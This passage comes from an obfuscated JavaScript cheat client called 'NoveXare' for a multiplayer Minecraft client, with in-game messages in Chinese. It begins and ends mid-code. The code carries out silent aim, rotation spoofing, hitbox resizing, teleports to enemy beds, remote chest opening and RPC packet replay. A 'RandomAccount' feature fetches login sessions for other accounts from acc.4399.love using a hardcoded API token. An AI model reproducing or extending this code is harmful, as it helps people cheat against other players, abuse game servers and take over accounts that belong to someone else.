      derp_y_r = derp_y_r - 360;
    }
    if (!head_rot) {
      derp_p_r = _0x412945.pitch;
    }
    if (!body_rot) {
      derp_y_r = _0x412945.yaw;
    }
    if (lock_head) {
      derp_p_r = 90;
    }
    last_tick_pos = self_pos;
    last_tick_item = _0x4f7660;
    last_tick_heal = _0x3ba0a3.current;
    lasttick_item_count = item_count;
  } catch (_0x1a350f) {
    clientMessage(_0x1a350f.stack);
    gc();
    exit();
  }
}
setInterval(() => {
  if (Derp) {
    var _0x3e20f6 = {
      pitch: derp_p_r,
      yaw: derp_y_r
    };
    var _0x6a5e0e = {
      id: self_id,
      pos: self_pos,
      mode: 1
    };
    _0x6a5e0e.ground = getEntityIsGround(self_id);
    _0x6a5e0e.rot = _0x3e20f6;
    _0x6a5e0e.yHeadRot = derp_p_r;
    if (other_can_see) {
      sendMovePlayer(_0x6a5e0e);
    }
    if (self_can_see) {
      setEntityRot(self_id, derp_p_r, derp_y_r);
      setEntityBodyRot(self_id, derp_y_r);
    }
  }
  if (Scaffold && (Scaffold_other || Scaffold_self) && Scaffold_aim_pos != null) {
    const _0x50e49a = getPlayerAngle(self_id, Scaffold_aim_pos, "yaw_pos");
    const _0x15f212 = getPlayerAngle(self_id, Scaffold_aim_pos, "pitch_pos");
    Scaffold_aim_pos = null;
    silentAim(_0x15f212, _0x50e49a, Scaffold_other, Scaffold_self);
  }
  if (AssistAim && (AssistAim_other || AssistAim_self) && target_list.length > 0) {
    let _0x522ce5 = getPlayerAngle(self_id, target_list[0], "pitch_pos");
    let _0x5ad71b = getPlayerAngle(self_id, target_list[0], "yaw_pos");
    silentAim(_0x522ce5, _0x5ad71b, AssistAim_other, AssistAim_self);
  }
}, 10);
globalThis.onExecuteCommandEvent = function (_0x173471) {
  if (ActivitySender) {
    sendChatMessage("我正在执行命令");
  }
  if (ShowCommand) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r ExecuteCMD §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0x173471);
  }
  const _0x117fc4 = _0x173471.split(" ");
  if (_0x117fc4[0] == "/set" && _0x117fc4[1] == "pos") {
    var _0x46f0a0 = {};
    _0x46f0a0.x = Number(_0x117fc4[2]);
    _0x46f0a0.y = Number(_0x117fc4[3]);
    _0x46f0a0.z = Number(_0x117fc4[4]);
    goto_pos = _0x46f0a0;
    if (_0x117fc4[5]) {
      default_speed = Number(_0x117fc4[5]);
    }
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "已设置目标坐标");
    }
    return true;
  }
  if (_0x117fc4[0] == "/set" && _0x117fc4[1] == "default" && _0x117fc4[2] == "config") {
    if (_0x117fc4[3] == "clear") {
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "已清除默认配置");
      }
      setData("default_config", "null");
      return true;
    }
    if (readFile(config_path + "/" + _0x117fc4[3] + ".json") != "{}") {
      setData("default_config", _0x117fc4[3]);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "已设置默认配置 - " + _0x117fc4[3]);
      }
    } else if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "文件为空或不存在 - " + _0x117fc4[3]);
    }
    return true;
  }
  if (_0x117fc4[0] == "/target") {
    if (_0x117fc4[1] == "self") {
      target_list[0] = self_id;
    }
    if (_0x117fc4[1] == "player") {
      target_list = getPlayerList();
    }
    if (_0x117fc4[1] == "all") {
      target_list = getEntityList();
    }
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "已设置" + target_list.length + "个目标");
    }
    return true;
  }
  if (_0x117fc4[0] == "/cleaner") {
    if (_0x117fc4[1] == "reload") {
      clear_config = JSON.parse(readFile(cleaner_path));
    }
    if (_0x117fc4[1] == "load") {
      clear_config = JSON.parse(readFile(_0x117fc4[2]));
    }
  }
  if (_0x117fc4[0] == "/bind") {
    if (_0x117fc4[1] == "RunAway" && globalThis[_0x117fc4[2]] != undefined) {
      RunAway_binds[_0x117fc4[2]] = _0x117fc4[3];
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "绑定 " + _0x117fc4[2] + " 与 " + _0x117fc4[3] + " 成功");
      }
      NoveXare_Config.RunAway_binds = RunAway_binds;
      return true;
    }
    if (_0x117fc4[1] === "key" && globalThis[_0x117fc4[2]] != undefined) {
      isBinding = _0x117fc4[2];
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "按下任意按键与" + _0x117fc4[2] + "绑定");
      }
      return true;
    }
    if (bind_func[_0x117fc4[1]] == undefined) {
      bind_func[_0x117fc4[1]] = [];
    }
    if (globalThis[_0x117fc4[2]] != undefined && globalThis[_0x117fc4[1]] != undefined) {
      bind_func[_0x117fc4[1]].push(_0x117fc4[2]);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "绑定 " + _0x117fc4[1] + " 与 " + _0x117fc4[2] + " 成功");
      }
      NoveXare_Config.binds = bind_func;
    } else if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "功能Key不存在");
    }
    return true;
  }
  if (_0x117fc4[0] == "/unbind") {
    if (_0x117fc4[1] === "key" && globalThis[_0x117fc4[2]] != undefined) {
      for (let _0x545fbd in key_bind_list) {
        if (key_bind_list[_0x545fbd] == _0x117fc4[2]) {
          delete key_bind_list[_0x545fbd];
          break;
        }
      }
      isBinding = _0x117fc4[2];
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "解除" + _0x117fc4[2] + "的按键绑定");
      }
      return true;
    }
    if (bind_func[_0x117fc4[1]] == undefined) {
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "该功能没有绑定任何功能");
      }
      return true;
    }
    if (globalThis[_0x117fc4[1]] != undefined && _0x117fc4[2] == "all") {
      delete bind_func[_0x117fc4[1]];
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "解除 " + _0x117fc4[1] + " 的所有绑定");
      }
      NoveXare_Config.binds = bind_func;
      return true;
    }
    if (_0x117fc4[1] == "all") {
      bind_func = {};
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "解除所有功能绑定");
      }
      NoveXare_Config.binds = bind_func;
      return true;
    }
    if (globalThis[_0x117fc4[2]] != undefined && globalThis[_0x117fc4[1]] != undefined) {
      bind_func[_0x117fc4[1]].splice(bind_func[_0x117fc4[1]].indexOf(_0x117fc4[2]), 1);
      if (bind_func[_0x117fc4[1]].length == 0) {
        delete bind_func[_0x117fc4[1]];
      }
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "解除绑定 " + _0x117fc4[1] + " 和 " + _0x117fc4[2] + " 成功");
      }
      NoveXare_Config.binds = bind_func;
    } else if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "功能Key不存在");
    }
    return true;
  }
  if (_0x117fc4[0] == "/nx") {
    if (globalThis[_0x117fc4[2]] == undefined) {
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "变量不存在");
      }
      return true;
    }
    if (_0x117fc4[1] == "num") {
      globalThis[_0x117fc4[2]] = Number(_0x117fc4[3]);
    }
    if (_0x117fc4[1] == "bool") {
      globalThis[_0x117fc4[2]] = Boolean(_0x117fc4[3]);
    }
    if (_0x117fc4[1] == "str") {
      globalThis[_0x117fc4[2]] = _0x117fc4[3];
    }
    if (_0x117fc4[1] == "arr") {
      globalThis[_0x117fc4[2]] = str2obj(_0x117fc4[3]);
    }
    if (_0x117fc4[1] == "obj") {
      globalThis[_0x117fc4[2]] = JSON.parse(_0x117fc4[3]);
    }
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r SetValue §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + globalThis[_0x117fc4[2]] + " ==> " + _0x117fc4[2]);
    }
    return true;
  }
};
globalThis.onCommandOutputEvent = function (_0x4c6a89, _0x56908b, _0x54b641) {
  if (ShowSendCommand) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + (" 类型:§e" + _0x4c6a89 + " §r结果:§e" + _0x54b641 + " §r数据:§e" + JSON.stringify(_0x56908b, null, 2)));
  }
  if (KickAura) {
    return true;
  }
};
globalThis.onCallModuleEvent = function (_0x5898b8) {
  if (ActivitySender) {
    sendChatMessage("我正在调用UI");
  }
  if (PVPDaLao) {
    setTitle("又或是红石大佬");
  }
  if (ShowUI) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r UI - Data §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + JSON.stringify(_0x5898b8, null, 2));
  }
  if (_0x5898b8.name == undefined) {
    if (Rocker && _0x5898b8.angle != undefined) {
      rocker_func = _0x5898b8;
    }
    if (Rocker && _0x5898b8.operation != undefined) {
      airjump_func = _0x5898b8;
    }
    return;
  }
  if (_0x5898b8.name == "显示摇杆" && _0x5898b8.fun == "fun_ride_flying" && !_0x5898b8.value) {
    setCameraAnchor(0, 0, 0);
  }
  if (_0x5898b8.fun == "fun_hitbox" && _0x5898b8.size != undefined) {
    temp_size = {
      x: _0x5898b8.size,
      y: _0x5898b8.size
    };
  }
  if (target_list.length > 0 && _0x5898b8.fun == "fun_HitBox" && _0x5898b8.value) {
    default_size = temp_size;
  }
  if (!_0x5898b8.name.includes("NoveXare") && _0x5898b8.fun != "fun_ride_flying") {
    return;
  }
  if (_0x5898b8.SauthLogin != undefined) {
    Sauths = _0x5898b8.SauthLogin;
  }
  for (key in _0x5898b8) {
    if (key == "value" || key == "fun" || key == "name" || key == "index" || key == "shortcut") {
      continue;
    }
    if (_0x5898b8.key === "getBed") {
      let _0x2b7d51 = new Set();
      let _0x2d4090 = getWorldPlayerList();
      for (let _0x495ad0 of _0x2d4090) {
        let _0x1eed08 = getTeams(getEntityName(_0x495ad0.id));
        if (_0x1eed08 === "NoveXare") {
          continue;
        }
        let _0x357dab = getPlayerBlockPos(_0x495ad0.id);
        let {
          x: _0x15a601,
          y: _0x651de9,
          z: _0x20be0c
        } = _0x357dab;
        for (let _0x391d2f = -10; _0x391d2f <= 10; _0x391d2f++) {
          for (let _0x28bb9b = -5; _0x28bb9b < 5; _0x28bb9b++) {
            for (let _0x3c938f = -10; _0x3c938f <= 10; _0x3c938f++) {
              let _0x466b40 = _0x15a601 + _0x391d2f;
              let _0x2df759 = _0x651de9 + _0x28bb9b;
              let _0x4f9632 = _0x20be0c + _0x3c938f;
              let _0x31cf90 = getBlock(_0x466b40, _0x2df759, _0x4f9632);
              if (_0x31cf90.namespace === "minecraft:bed" && !_0x2b7d51.has(_0x1eed08)) {
                _0x2b7d51.add(_0x1eed08);
                var _0x3a8706 = {
                  x: _0x466b40,
                  y: _0x2df759,
                  z: _0x4f9632
                };
                var _0x1b946e = {
                  player_team: _0x1eed08,
                  pos: _0x3a8706
                };
                bed_list.push(_0x1b946e);
              }
            }
          }
        }
      }
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r BedList §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 已获取床坐标 共" + bed_list.length + "条");
      }
    }
    if (_0x5898b8.key == "InfiniteBreak") {
      if (bed_list.length == 0) {
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 请先获取床的坐标");
        }
        return;
      }
      var _0x442bac = {
        type: "form",
        title: "队伍列表",
        content: "请选择需要拆除的床",
        buttons: [{
          text: "没有队伍信息"
        }]
      };
      const _0x441e09 = getEntityMotion(self_id);
      const _0x1b1787 = getEntityPos(self_id);
      for (let _0x48efae in bed_list) {
        _0x442bac.buttons[_0x48efae] = {
          text: "§b" + bed_list[_0x48efae].player_team + " §r§e坐标:" + JSON.stringify(bed_list[_0x48efae].pos, null, 2)
        };
      }
      addForm(JSON.stringify(_0x442bac), function (_0x5ed3f) {
        var _0x20df27 = bed_list[_0x5ed3f];
        var _0x5e7ee4 = _0x20df27.pos;
        callModule(35, "{\"value\":true,\"count\":10}");
        addTP(_0x5e7ee4.x, _0x5e7ee4.y, _0x5e7ee4.z, 5);
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 已传送至 " + _0x20df27.player_team);
        }
      });
    }
    if (_0x5898b8.key === "team" || _0x5898b8.key === "text") {
      EditValue(_0x5898b8.key, _0x5898b8.key === "team" ? team : text);
    }
    if (_0x5898b8.key === "add_item") {
      const _0x2404a3 = getCarried(self_id);
      const _0x9b3a0a = JSON.parse(readFile(cleaner_path));
      var _0x3355be = {
        namespace: _0x2404a3.namespace,
        aux: _0x2404a3.aux,
        max_num: _0x2404a3.count
      };
      _0x9b3a0a.push(_0x3355be);
      write_file(cleaner_path, JSON.stringify(_0x9b3a0a, null, 4));
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddItem §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0x2404a3.name);
      }
    }
    if (_0x5898b8.key === "content") {
      EditValue(_0x5898b8.key, content);
    }
    if (_0x5898b8.key === "edit_KickAura") {
      EditValue(_0x5898b8.key, edit_KickAura);
    }
    if (_0x5898b8.key === "particle_type") {
      EditValue(_0x5898b8.key, particle_type);
    }
    if (_0x5898b8.key === "line_particle_type") {
      EditValue(_0x5898b8.key, line_particle_type);
    }
    if (_0x5898b8.key === "attack_particle_type") {
      EditValue(_0x5898b8.key, attack_particle_type);
    }
    if (_0x5898b8.key === "arrow_particle_type") {
      EditValue(_0x5898b8.key, arrow_particle_type);
    }
    if (_0x5898b8.key === "surround_particle_type") {
      EditValue(_0x5898b8.key, surround_particle_type);
    }
    if (_0x5898b8.key === "throwable_particle_type") {
      EditValue(_0x5898b8.key, throwable_particle_type);
    }
    if (_0x5898b8.key === "attack_sound_type") {
      EditValue(_0x5898b8.key, attack_sound_type);
    }
    if (_0x5898b8.key === "exit") {
      clientMessage("§3§l[NoveXare] §r§7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§c") + " Exit!");
      if (AutoSaveCfg) {
        clientMessage("§3§l[NoveXare] §r§7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 自动保存当前配置");
        const _0x3c1e92 = Date.now();
        write_file(config_path + "/自动保存配置 - " + _0x3c1e92 + ".json", JSON.stringify(NoveXare_Config, null, 4));
        if (AutoLoadCfg) {
          setData("default_config", "自动保存配置 - " + _0x3c1e92);
        }
      }
      gc();
      exit();
    }
    if (_0x5898b8.key === "SoundPlayer_type") {
      EditValue(_0x5898b8.key, SoundPlayer_type);
    }
    if (_0x5898b8.key === "attack_sound_level") {
      EditValue(_0x5898b8.key, attack_sound_level);
    }
    if (_0x5898b8.key === "edit_action_id") {
      EditValue(_0x5898b8.key, edit_action_id);
    }
    if (_0x5898b8.key === "SoundPlayer_level") {
      EditValue(_0x5898b8.key, SoundPlayer_level);
    }
    if (_0x5898b8.key === "edit_suffix") {
      EditValue(_0x5898b8.key, edit_suffix);
    }
    if (_0x5898b8.key === "DropInv") {
      for (let _0x2f6d31 = 0; _0x2f6d31 < 36; _0x2f6d31++) {
        const _0x2c6eb0 = getInventory(self_id, _0x2f6d31);
        if (_0x2c6eb0.namespace == "minecraft:air") {
          continue;
        }
        if (_0x2c6eb0.count < 1) {
          continue;
        }
        for (let _0x5194de = 0; _0x5194de < _0x2c6eb0.count; _0x5194de++) {
          drop_list.push(_0x2f6d31);
        }
      }
    }
    if (_0x5898b8.key === "LookTP") {
      var _0x3f8b86 = {};
      for (let _0x5c2e1d = 0; _0x5c2e1d < 500; _0x5c2e1d++) {
        _0x3f8b86 = getDisplacement(_0x5c2e1d, getEntityPos(self_id), getCameraRotation());
        const _0x5cf5b3 = getBlock(_0x3f8b86.x, _0x3f8b86.y, _0x3f8b86.z);
        if (_0x5cf5b3.namespace != "minecraft:air") {
          break;
        }
      }
      if (_0x3f8b86 != {}) {
        const _0x443e0d = getEntityPos(self_id);
        if (func_mode.LookTP_mode == 0) {
          Teleport(_0x3f8b86.x, _0x3f8b86.y + 1.53, _0x3f8b86.z);
        }
        if (func_mode.LookTP_mode == 1) {
          setPos(_0x3f8b86.x, _0x3f8b86.y + 1.53, _0x3f8b86.z);
        }
      }
    }
    if (_0x5898b8.key === "OpenChest") {
      var _0x5414f1 = {
        type: "form",
        title: "容器列表",
        content: "请选择需要打开的容器",
        buttons: [{
          text: "暂无容器"
        }]
      };
      var _0x2aec16 = [];
      var _0x51303f = 0;
      var _0x34aec0 = getPlayerBlockPos(self_id);
      const _0x29a9f3 = ["minecraft:barrel", "minecraft:chest", "minecraft:trapped_chest"];
      const _0x4561fb = "shulker_box";
      for (let _0x67a29d = -7; _0x67a29d < 7; _0x67a29d++) {
        for (let _0x12d3d2 = -7; _0x12d3d2 < 7; _0x12d3d2++) {
          for (let _0x9d6262 = -7; _0x9d6262 < 7; _0x9d6262++) {
            const _0x3e7581 = _0x67a29d + _0x34aec0.x;
            const _0x216a15 = _0x12d3d2 + _0x34aec0.y;
            const _0xb73855 = _0x9d6262 + _0x34aec0.z;
            const _0x43b6d9 = getBlock(_0x3e7581, _0x216a15, _0xb73855);
            if (_0x29a9f3.includes(_0x43b6d9.namespace) || _0x43b6d9.namespace.includes(_0x4561fb)) {
              const _0xd00ae0 = getBlock(_0x3e7581, _0x216a15 + 1, _0xb73855);
              var _0x267f81 = {
                text: "命名空间: " + _0x43b6d9.namespace + "\n坐标:   " + (_0xd00ae0.namespace == "minecraft:air" ? "" : " §c=>§e 容器顶上存在方块")
              };
              _0x5414f1.buttons[_0x51303f] = _0x267f81;
              var _0x42d870 = {
                x: _0x3e7581,
                y: _0x216a15,
                z: _0xb73855
              };
              _0x2aec16[_0x51303f] = _0x42d870;
              _0x51303f++;
            }
          }
        }
      }
      if (_0x51303f == 0) {
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 暂无容器");
        }
        return;
      }
      addForm(JSON.stringify(_0x5414f1), function (_0x54140a) {
        var _0x3f4102 = _0x2aec16[_0x54140a];
        buildBlock(self_id, _0x3f4102.x, _0x3f4102.y, _0x3f4102.z, 1);
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 已打开该容器");
        }
      });
    }
    if (_0x5898b8.key === "UpJump") {
      setMotion(0, up_down_speed, 0);
    }
    if (_0x5898b8.key === "DownJump") {
      setMotion(0, -up_down_speed, 0);
    }
    if (_0x5898b8.key === "RepeatRpc") {
      for (let _0x1ae3ce = 0; _0x1ae3ce < RepeatRpc_times; _0x1ae3ce++) {
        sendRpc(last_PyRpc.id, last_PyRpc.data);
      }
    }
    if (_0x5898b8.key === "keyword") {
      EditValue(_0x5898b8.key, keyword);
    }
    if (_0x5898b8.key === "tip_keyword") {
      EditValue(_0x5898b8.key, tip_keyword);
    }
    if (_0x5898b8.key === "send_keyword") {
      EditValue(_0x5898b8.key, send_keyword);
    }
    if (_0x5898b8.key == "AttackSelf_one") {
      attack(self_id, AttackSwing);
    }
    if (_0x5898b8.key == "RemoveSelf") {
      removeEntity(self_id);
    }
    if (_0x5898b8.key === "chat_keyword") {
      EditValue(_0x5898b8.key, chat_keyword);
    }
    if (_0x5898b8.key === "receive_keyword") {
      EditValue(_0x5898b8.key, receive_keyword);
    }
    if (_0x5898b8.key === "keyword2") {
      EditValue(_0x5898b8.key, keyword2);
    }
    if (_0x5898b8.key === "delete_sauth") {
      setData("sauths", "");
    }
    if (_0x5898b8.key === "RandomAccount") {
      curl_get("http://acc.4399.love/user/get_sauth_api.php?token=Yy5IC8f3HqgUVUYRUq33q5Ha8GuHdnun&type=sauth", {}, (_0x51d202, _0x1d83ae) => {
        var _0x274d6d = JSON.parse(_0x1d83ae);
        globalThis.Sauths = _0x274d6d.data.account;
        showToast("已成功获取账号，请直接登录");
      });
    }
    if (_0x5898b8.key === "select_hotbar_items") {
      EditValue("selectitems", selectitems);
    }
    if (_0x5898b8.key === "select_hotbar_slots") {
      EditValue("select_hotbar_slots", select_hotbar_slots);
    }
    if (_0x5898b8.key === "send_keyword2") {
      EditValue(_0x5898b8.key, send_keyword2);
    }
    if (_0x5898b8.key === "receive_keyword2") {
      EditValue(_0x5898b8.key, receive_keyword2);
    }
    if (_0x5898b8.key === "entity_keyword") {
      EditValue(_0x5898b8.key, entity_keyword);
    }
    if (_0x5898b8.key === "SearchModule") {
      addForm("{\"type\":\"custom_form\",\"title\":\"搜索功能\",\"content\":[{\"type\":\"input\",\"text\":\"功能名或者功能Key\",\"placeholder\":\"AssistAim或自动瞄准\",\"default\":\"\"},{\"type\": \"toggle\",\"text\": \"模糊搜索\",\"default\": true}]}", function (_0x2775de, _0x9299c5) {
        var _0x4ed4b4 = {
          type: "Menu",
          color: "#d2000000",
          alpha: 0.95,
          can_close: true,
          title: {
            name: "搜索结果",
            elevation: 0,
            background: "#000000",
            padding: [5, 5, 5, 5],
            margins: [0, 0, 0, 0],
            colors: ["#FFFFFF", "#FFFFFF"]
          },
          params: [-2, -2],
          padding: [3, 0, 3, 0],
          margins: [0, 0, 0, 0],
          show_dividers: true,
          radius: 6,
          hide: false,
          items: [{
            type: "TextView",
            sound: "click.mp3",
            name: "NoveXare功能",
            size: 13,
            color: "#FFFFFF",
            tag: "fun_entity_event_manager",
            padding: [5, 5, 5, 5],
            items: [{
              type: "TextView",
              sound: "click.mp3",
              name: "没有结果",
              color: "#FFFFFF",
              size: 12,
              padding: [5, 5, 5, 5]
            }]
          }]
        };
        var _0x11d288 = 0;
        var _0x43beaf = getResource();
        var _0x275ebb = file_list(_0x43beaf + "/ui");
        for (var _0x239393 of _0x275ebb) {
          if (!_0x239393.name.includes("NoveXare")) {
            continue;
          }
          var _0x5676fd = JSON.parse(read_file(_0x239393.path));
          if (_0x5676fd.items[0].items == undefined) {
            continue;
          }
          for (var _0x1b80d5 of _0x5676fd.items[0].items) {
            if (_0x1b80d5.name == undefined || _0x1b80d5.key == undefined) {
              continue;
            }
            if (_0x9299c5) {
              if (_0x1b80d5.name.includes(_0x2775de) || _0x1b80d5.key.includes(_0x2775de)) {
                _0x4ed4b4.items[0].items[_0x11d288] = _0x1b80d5;
                _0x11d288++;
              }
            } else if (_0x1b80d5.name == _0x2775de || _0x1b80d5.key == _0x2775de) {
              _0x4ed4b4.items[0].items[_0x11d288] = _0x1b80d5;
              _0x11d288++;
            }
          }
        }
        write_file(_0x43beaf + "/script/temp.js", "const t = String(Date.now());\nloadMenu(t, '" + JSON.stringify(_0x4ed4b4) + "');");
        loadScript("temp.js");
        setTimeout(() => file_delete(_0x43beaf + "/script/temp.js"), 500);
      });
    }
    if (_0x5898b8.key === "delete_PlayPos") {
      play_pos_list = [];
    }
    if (_0x5898b8.key === "addPlayPos") {
      const {
        x,
        y,
        z
      } = getPlayerBlockPos(self_id);
      addForm("{\"type\":\"custom_form\",\"title\":\"添加坐标\",\"content\":[{\"type\":\"input\",\"text\":\"以英文逗号 , 分割坐标\",\"placeholder\":\"0,0,0\",\"default\":\"" + obj2str([x, y, z]) + "\"}]}", function (_0x5eebb1) {
        const _0x1bfe8f = _0x5eebb1.split(",");
        var _0x80181c = {};
        _0x80181c.x = Number(_0x1bfe8f[0]);
        _0x80181c.y = Number(_0x1bfe8f[1]);
        _0x80181c.z = Number(_0x1bfe8f[2]);
        play_pos_list.push(_0x80181c);
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 添加坐标成功 当前" + play_pos_list.length + "组坐标");
        }
      });
    }
    if (_0x5898b8.key === "load_sound") {
      const _0x316a13 = "{\"type\":\"custom_form\",\"title\":\"输入路径\",\"content\":[{\"type\":\"input\",\"text\":\"路径:\",\"default\":\"\"}]}";
      addForm(_0x316a13, function (_0x16a624) {
        const _0x2d2346 = read_file(_0x16a624);
        if (_0x2d2346 != "" && SoundPlayer) {
          sound_data = JSON.parse(_0x2d2346);
          sound_file = surround_loop ? _0x2d2346 : [];
          if (FuncTip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 加载成功 共" + sound_data.length + "条音频数据");
          }
        } else if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 加载失败 - 文件为空或不存在或未启用功能");
        }
      });
    }
    if (_0x5898b8.key === "select_sound") {
      const _0x12e5dc = {
        type: "form",
        title: "音乐文件",
        content: "选择要加载的音乐",
        buttons: [{
          text: "没有文件"
        }]
      };
      const _0x5b95ca = file_list(getResource() + "/sounds/NoveXare");
      _0x5b95ca.sort((_0x44f340, _0x24da3f) => _0x44f340.name.localeCompare(_0x24da3f.name));
      for (let _0x3b358e = 0; _0x3b358e < _0x5b95ca.length; _0x3b358e++) {
        _0x12e5dc.buttons[_0x3b358e] = {
          text: _0x5b95ca[_0x3b358e].name,
          image: {
            type: "path",
            data: "textures/ui/sound_glyph_color_2x.png"
          }
        };
      }
      const _0x32bcb4 = JSON.stringify(_0x12e5dc);
      addForm(_0x32bcb4, function (_0x58b636) {
        if (_0x5b95ca.length > 0 && _0x58b636 >= 0) {
          const _0x56ddab = read_file(_0x5b95ca[_0x58b636].path);
          if (_0x56ddab != "" && SoundPlayer) {
            sound_data = JSON.parse(_0x56ddab);
            sound_file = surround_loop ? _0x56ddab : [];
            if (FuncTip) {
              clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 加载成功 共" + sound_data.length + "条音频数据");
            }
          } else if (FuncTip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 加载失败 - 文件为空或不存在或未启用功能");
          }
        }
      });
    }
    if (_0x5898b8.key === "save_config") {
      const _0x2889d1 = "{\"type\":\"custom_form\",\"title\":\"输入保存名称\",\"content\":[{\"type\":\"input\",\"text\":\"名称:\",\"default\":\"NX配置 - " + Date.now() + "\"}]}";
      addForm(_0x2889d1, function (_0x2b5e2d) {
        write_file(config_path + "/" + _0x2b5e2d + ".json", JSON.stringify(NoveXare_Config, null, 4));
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 保存成功");
        }
      });
    }
    if (_0x5898b8.key === "load_config") {
      const _0x27182e = {
        type: "form",
        title: "配置文件",
        content: "选择要加载的配置",
        buttons: [{
          text: "没有配置"
        }]
      };
      const _0x3ff36e = file_list(config_path);
      _0x3ff36e.sort((_0x5195c4, _0x355e99) => _0x5195c4.name.localeCompare(_0x355e99.name));
      for (let _0x193fa0 = 0; _0x193fa0 < _0x3ff36e.length; _0x193fa0++) {
        _0x27182e.buttons[_0x193fa0] = {
          text: _0x3ff36e[_0x193fa0].name,
          image: {
            type: "path",
            data: "textures/ui/gear.png"
          }
        };
      }
      const _0x128d4b = JSON.stringify(_0x27182e);
      addForm(_0x128d4b, function (_0x5974de) {
        if (_0x3ff36e.length > 0 && _0x5974de >= 0) {
          var _0x57e131 = JSON.parse(readFile(_0x3ff36e[_0x5974de].path));
          NoveXare_Config = _0x57e131;
          var _0x265485 = 0;
          bind_func = _0x57e131.binds;
          key_bind_list = _0x57e131.key_binds;
          RunAway_binds = _0x57e131.RunAway_binds;
          for (var _0x15d645 in _0x57e131) {
            _0x265485++;
            if (_0x15d645.includes("_mode")) {
              func_mode[_0x15d645] = _0x57e131[_0x15d645];
            }
            if (_0x15d645 != "cmd" && _0x15d645 != "binds") {
              globalThis[_0x15d645] = _0x57e131[_0x15d645];
            }
          }
          if (FuncTip) {
